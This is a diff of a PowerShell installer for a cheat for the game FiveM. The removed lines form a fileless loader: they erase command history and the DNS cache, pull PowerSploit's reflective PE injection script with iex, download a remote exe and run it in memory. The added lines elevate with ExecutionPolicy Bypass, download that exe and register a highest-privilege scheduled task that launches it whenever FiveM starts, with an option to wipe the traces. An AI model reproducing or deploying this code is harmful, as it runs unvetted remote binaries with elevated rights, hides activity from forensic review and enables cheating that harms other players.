@@ -1,72 +1,108 @@
 # =========================================================================
-# PREMIUM 2SQUAD - FILELESS EXE LOADER (NATIVE C++)
+# PREMIUM 2SQUAD - AUTO LAUNCH INSTALLER
 # =========================================================================
 $ErrorActionPreference = "SilentlyContinue"
-$host.UI.RawUI.WindowTitle = "PREMIUM 2SQUAD - LOADER"
+$host.UI.RawUI.WindowTitle = "PREMIUM 2SQUAD - INSTALLER"
 Clear-Host
 
+# -----------------------------
+# Check for Administrator rights (จำเป็นสำหรับการตั้งค่า Task และ AuditPol)
+# -----------------------------
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
+    Write-Host "[!] Restarting with Administrator privileges..." -ForegroundColor Yellow
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# -----------------------------
+# PREMIUM UI MENU
+# -----------------------------
 Write-Host ""
 Write-Host "        ___  ___  ___  _  __ __  _____  __  __ __ " -ForegroundColor Cyan
 Write-Host "       / _ \/ _ \/ __// |/ // / / /   |/ / / // / " -ForegroundColor Cyan
 Write-Host "      / ___/ , _/ _/ /    // /_/ / /| / /_/ // /_ " -ForegroundColor Cyan
 Write-Host "     /_/  /_/|_/___//_/|_/ \____/_/ |_/____//___/ " -ForegroundColor Cyan
 Write-Host "  ========================================================" -ForegroundColor DarkGray
-Write-Host "          P R E M I U M   2 S Q U A D   L O A D E R" -ForegroundColor White
+Write-Host "          P R E M I U M   A U T O   I N S T A L L E R" -ForegroundColor White
 Write-Host "  ========================================================" -ForegroundColor DarkGray
 Write-Host ""
-
-# ==========================================
-# AUTO HISTORY CLEANUP & CLEAR LOCAL CACHE
-# ==========================================
-Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Wiping traces and clearing local cache..." -ForegroundColor White
-
-# เคลียร์ DNS Cache ของเครื่องเพื่อป้องกันการจำลิ้งก์เก่า
-Clear-DnsClientCache -ErrorAction SilentlyContinue
-
-$historyPath = (Get-PSReadLineOption).HistorySavePath
-if (Test-Path $historyPath) {
-    # ลบเนื้อหาไฟล์ประวัติ
-    Clear-Content -Path $historyPath -Force -ErrorAction SilentlyContinue
-    # เคลียร์ประวัติในหน้าต่าง
-    Clear-History
-    # ปิดการเซฟประวัติ
-    Set-PSReadLineOption -HistorySaveStyle SaveNothing
-    
-    Start-Sleep -Milliseconds 500
-    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " System cleaned perfectly. No trace left." -ForegroundColor Green
-}
+Write-Host "  [1] Install System (Auto-Launch with FiveM)" -ForegroundColor Green
+Write-Host "  [2] Uninstall & Clean Traces" -ForegroundColor Red
+Write-Host "  [3] Exit" -ForegroundColor DarkGray
 Write-Host ""
 
-# ==========================================
-# FILELESS DOWNLOAD & EXECUTION (ANTI-CACHE SYSTEM)
-# ==========================================
-Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Connecting to secure server (Bypassing Cache)..." -ForegroundColor White
+$choice = Read-Host "  [?] Select Option (1-3)"
+Write-Host ""
 
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+# -----------------------------
+# Define Secure Paths (เปลี่ยนจาก System32 เป็น AppData เพื่อความปลอดภัย)
+# -----------------------------
+$appDataPath   = Join-Path $env:LOCALAPPDATA "Premium2Squad"
+$exeDestination = Join-Path $appDataPath "2SquadCore.exe"
+$databasePath  = Join-Path $appDataPath "database.txt"
+$taskName      = "Premium2Squad_AutoService"
 
-# สร้างตัวเลขสุ่ม (Cache-Buster) เพื่อหลอกเซิร์ฟเวอร์ไม่ให้จำ Cache
-$RandomHash = Get-Random
+# ⚠️ เปลี่ยนลิ้งก์ตรงนี้ให้เป็นไฟล์ .exe ของคุณบน GitHub
+$exeUrl = "https://raw.githubusercontent.com/Vegusnerver/2squad/main/dxgi.exe?t=$(Get-Random)"
 
-try {
-    # 1. โหลดเครื่องมือ Reflective PE (พ่วงตัวเลขสุ่มกัน Cache)
-    $InjectorURL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1?t=$RandomHash"
-    iex (New-Object Net.WebClient).DownloadString($InjectorURL)
+# -----------------------------
+# 1. INSTALL MODE
+# -----------------------------
+if ($choice -eq "1") {
+    Write-Host "  [*] Initializing Installation Process..." -ForegroundColor Yellow
 
-    # 2. โหลดไฟล์ EXE ของคุณ (แก้เป็นลิ้งก์ Raw ของ dxgi.exe แล้ว)
-    $ExeURL = "https://raw.githubusercontent.com/Vegusnerver/2squad/main/dxgi.exe?t=$RandomHash"
+    # สร้างโฟลเดอร์ลับถ้ายังไม่มี
+    if (-not (Test-Path $appDataPath)) {
+        New-Item -ItemType Directory -Force -Path $appDataPath | Out-Null
+    }
+
+    Write-Host "  [*] Downloading Core Files..." -ForegroundColor Yellow
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination -UseBasicParsing
+
+    $key = Read-Host "  [?] Enter your Premium License Key"
+    Set-Content -Path $databasePath -Value $key
+
+    Write-Host "  [*] Configuring System Event Hooks..." -ForegroundColor Yellow
     
-    $WebClient = New-Object System.Net.WebClient
-    $ExeBytes = $WebClient.DownloadData($ExeURL)
-    
-    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Payload ready ($($ExeBytes.Length) bytes)." -ForegroundColor Green
-    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Executing C++ Native Payload in memory..." -ForegroundColor White
-    
+    # เปิดระบบบันทึกประวัติการเปิดโปรแกรม (เพื่อใช้เป็น Trigger)
+    auditpol /set /subcategory:"Process Creation" /success:enable | Out-Null
+
+    # สร้าง Scheduled Task ผูกกับการเปิด FiveM.exe รันด้วยสิทธิ์ Highest ของ User ปัจจุบัน (ปลอดภัยกว่า SYSTEM)
+    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $cmd = "cmd /c schtasks /create /tn `"$taskName`" /tr `"$exeDestination`" /sc ONEVENT /ec Security /mo `"*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName']='%localappdata%\FiveM\FiveM.exe']]`" /ru `"$currentUser`" /rl HIGHEST /f"
+    Invoke-Expression $cmd | Out-Null
+
+    Write-Host "`n  [+] Installation Completed!" -ForegroundColor Green
+    Write-Host "  [+] The cheat will now automatically launch whenever FiveM is opened." -ForegroundColor Cyan
+    Start-Sleep -Seconds 5
+}
+
+# -----------------------------
+# 2. CLEAN MODE
+# -----------------------------
+elseif ($choice -eq "2") {
+    Write-Host "  [*] Wiping Installation and Traces..." -ForegroundColor Yellow
+
+    # ลบ Scheduled Task
+    schtasks /delete /tn $taskName /f 2>$null | Out-Null
+
+    # ลบโฟลเดอร์และไฟล์ทั้งหมดแบบถอนรากถอนโคน
+    if (Test-Path $appDataPath) { 
+        Remove-Item -Path $appDataPath -Recurse -Force 
+    }
+
+    Write-Host "`n  [+] Cleanup Completed. Your system is fully clean." -ForegroundColor Green
+    Start-Sleep -Seconds 3
+}
+
+# -----------------------------
+# 3. EXIT
+# -----------------------------
+elseif ($choice -eq "3") {
+    exit
+}
+else {
+    Write-Host "  [!] Invalid choice. Exiting..." -ForegroundColor Red
     Start-Sleep -Seconds 2
-    
-    # 3. สั่งรัน EXE เข้า Memory ทันที
-    Invoke-ReflectivePEInjection -PEBytes $ExeBytes -ForceASLR
-    
-} catch {
-    Write-Host "`n  [!] Execution Failed: $($_.Exception.Message)" -ForegroundColor Red
-    Write-Host "  [!] Make sure your C++ executable is compiled as 64-bit (x64)." -ForegroundColor Red
 }
